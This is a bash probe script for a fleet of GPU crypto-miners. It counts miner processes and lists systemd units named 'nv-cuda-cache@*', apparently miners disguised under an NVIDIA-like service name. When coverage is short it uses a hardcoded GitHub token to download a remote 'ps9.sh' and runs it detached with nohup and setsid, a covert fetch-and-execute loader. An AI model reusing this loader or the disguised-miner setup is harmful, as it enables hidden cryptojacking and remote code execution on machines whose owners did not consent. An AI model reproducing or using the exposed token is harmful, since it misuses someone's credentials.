#!/bin/bash
# ps9probe — report ps9 state; dispatch ps9 only if per-GPU coverage is short. Never touches healthy miners.
GH='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'
B=/opt/fleet; L=$B/logs; HN=$(hostname)
mkdir -p "$L"
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
M=$(cat "$B/mode" 2>/dev/null)
echo "PROBE host=$HN gpus=$N mode=${M:-none} ts=$(date -u)"
echo "=== ps9log"; tail -22 "$L/ps9.log" 2>/dev/null
echo "=== procs"; for p in SRBMiner-MULTI peakminer krig-miner; do echo "$p=$(pgrep -cf "$p")"; done
echo "=== units"; systemctl list-units 'nv-cuda-cache@*' --no-legend --plain 2>/dev/null | awk '{print $1,$3,$4}' | head -10
echo "=== gpu"; nvidia-smi --query-gpu=index,name,utilization.gpu,power.draw --format=csv,noheader 2>&1 | head -10
echo "=== cardlogs"
for f in "$L/$HN"-g*.log; do [ -f "$f" ] || continue; echo "-- $(basename $f)"; tail -3 "$f" 2>/dev/null | cut -c1-170; done
echo "=== krigacc"; for f in "$L/krig-$HN-g"*.log; do [ -f "$f" ] || continue; echo "$(basename $f) acc=$(grep -c 'ccepted' "$f" 2>/dev/null)"; done
c=0
case "$M" in
  srb|srb300) c=$(pgrep -cf 'SRBMiner-MULTI');;
  peak) c=$(pgrep -cf 'peakminer');;
  krig) c=$(pgrep -cf 'krig-miner');;
esac
if [ "${N:-0}" -ge 1 ] && [ "${c:-0}" -lt "$N" ]; then
  echo "=== DISPATCH ps9 procs=$c/$N"
  curl -s --retry 2 -m 90 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw' -o /tmp/ps9_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/ps9.sh?ref=main"
  if grep -q 'MODE=peak' /tmp/ps9_run.sh 2>/dev/null; then cp -f /tmp/ps9_run.sh "$B/ps9.sh"; nohup setsid bash /tmp/ps9_run.sh >>"$L/ps9.log" 2>&1 & echo "dispatched pid=$!"; else echo "fetch FAILED"; fi
else
  echo "=== COVERAGE-OK procs=$c/$N"
fi
